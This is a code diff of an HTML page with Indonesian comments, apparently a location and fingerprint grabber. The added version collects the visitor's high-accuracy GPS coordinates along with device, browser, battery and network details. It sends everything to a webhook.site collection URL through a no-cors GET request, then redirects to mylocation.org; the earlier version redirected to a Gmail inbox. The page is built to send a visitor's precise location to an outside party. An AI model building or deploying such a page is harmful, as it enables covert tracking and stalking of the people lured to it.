@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Advanced GET Webhook</title>
+<title>Advanced GET Webhook with Geolocation</title>
 </head>
 
 <body>
@@ -13,222 +13,136 @@ SEND
 
 <pre id="out"></pre>
 
-
 <script>
-
-const WEBHOOK =
-"https://webhook.site/51056dab-66b0-49de-b851-02cfee543777";
-
-
-async function send(){
-
-
-let data = {
-
-event:"advanced_browser_info",
-
-time_utc:new Date().toISOString(),
-
-time_local:new Date().toString(),
-
-timezone:Intl.DateTimeFormat()
-.resolvedOptions()
-.timeZone,
-
-
-url:location.href,
-
-referrer:document.referrer || null,
-
-title:document.title,
-
-
-user_agent:navigator.userAgent,
-
-platform:navigator.platform,
-
-vendor:navigator.vendor,
-
-
-language:navigator.language,
-
-languages:navigator.languages,
-
-
-online:navigator.onLine,
-
-cookie_enabled:navigator.cookieEnabled,
-
-
-cores:
-navigator.hardwareConcurrency || null,
-
-
-memory:
-navigator.deviceMemory || null,
-
-
-touch:
-("ontouchstart" in window),
-
-
-
-screen:{
-
-width:screen.width,
-
-height:screen.height,
-
-availWidth:screen.availWidth,
-
-availHeight:screen.availHeight,
-
-pixelRatio:devicePixelRatio
-
-},
-
-
-
-window:{
-
-width:innerWidth,
-
-height:innerHeight
-
-},
-
-
-
-location:{
-
-timezone:
-Intl.DateTimeFormat()
-.resolvedOptions()
-.timeZone
-
-},
-
-
-
-visibility:
-document.visibilityState
-
-};
-
-
-
-
-// battery jika tersedia
-
-try{
-
-let battery =
-await navigator.getBattery();
-
-data.battery={
-
-level:
-battery.level,
-
-charging:
-battery.charging
-
-};
-
+const WEBHOOK = "https://webhook.site/51056dab-66b0-49de-b851-02cfee543777";
+
+// Fungsi Promise untuk mengambil lokasi presisi tinggi
+function getGeolocation() {
+    return new Promise((resolve) => {
+        if (!("geolocation" in navigator)) {
+            resolve("not supported");
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy, // Akurasi dalam meter
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed,
+                    timestamp: position.timestamp
+                });
+            },
+            (error) => {
+                resolve({
+                    error: error.message,
+                    code: error.code
+                });
+            },
+            {
+                enableHighAccuracy: true, // Memaksa GPS hardware jika tersedia
+                timeout: 10000,           // Batas waktu 10 detik
+                maximumAge: 0             // Mencegah penggunaan cache lokasi lama
+            }
+        );
+    });
 }
 
-catch(e){
+async function send() {
+    let data = {
+        event: "advanced_browser_info",
+        time_utc: new Date().toISOString(),
+        time_local: new Date().toString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
 
-data.battery="not supported";
+        url: location.href,
+        referrer: document.referrer || null,
+        title: document.title,
 
+        user_agent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+
+        language: navigator.language,
+        languages: navigator.languages,
+
+        online: navigator.onLine,
+        cookie_enabled: navigator.cookieEnabled,
+
+        cores: navigator.hardwareConcurrency || null,
+        memory: navigator.deviceMemory || null,
+        touch: ("ontouchstart" in window),
+
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            pixelRatio: devicePixelRatio
+        },
+
+        window: {
+            width: innerWidth,
+            height: innerHeight
+        },
+
+        visibility: document.visibilityState
+    };
+
+    // 1. Mengambil Geolocation Akurat
+    data.geolocation = await getGeolocation();
+
+    // 2. Battery Status (jika didukung)
+    try {
+        let battery = await navigator.getBattery();
+        data.battery = {
+            level: battery.level,
+            charging: battery.charging
+        };
+    } catch(e) {
+        data.battery = "not supported";
+    }
+
+    // 3. Network Connection Info (jika didukung)
+    if (navigator.connection) {
+        data.connection = {
+            type: navigator.connection.type,
+            effective: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+        };
+    }
+
+    // Menyusun URL Query Parameters
+    let params = new URLSearchParams();
+    for (let key in data) {
+        if (typeof data[key] === "object") {
+            params.append(key, JSON.stringify(data[key]));
+        } else {
+            params.append(key, data[key]);
+        }
+    }
+
+    let url = WEBHOOK + "?" + params.toString();
+
+    document.getElementById("out").textContent = url;
+
+    // Kirim request via GET
+    fetch(url, {
+        method: "GET",
+        mode: "no-cors"
+    });
+
+    // Pengalihan halaman
+    setTimeout(() => {
+        location.href = "https://mylocation.org/";
+    }, 1200);
 }
-
-
-
-
-
-// koneksi jika tersedia
-
-if(navigator.connection){
-
-data.connection={
-
-type:
-navigator.connection.type,
-
-effective:
-navigator.connection.effectiveType,
-
-downlink:
-navigator.connection.downlink,
-
-rtt:
-navigator.connection.rtt
-
-};
-
-}
-
-
-
-
-
-let params =
-new URLSearchParams();
-
-
-
-for(let key in data){
-
-if(typeof data[key]=="object"){
-
-params.append(
-key,
-JSON.stringify(data[key])
-);
-
-}else{
-
-params.append(
-key,
-data[key]
-);
-
-}
-
-}
-
-
-
-let url =
-WEBHOOK+"?"+params.toString();
-
-
-
-document.getElementById("out").textContent =
-url;
-
-
-
-fetch(url,{
-method:"GET",
-mode:"no-cors"
-});
-
-
-
-setTimeout(()=>{
-
-location.href="https://mail.google.com/mail/u/0/#inbox";
-
-},1200);
-
-
-}
-
-
 </script>
-
 
 </body>
 </html>
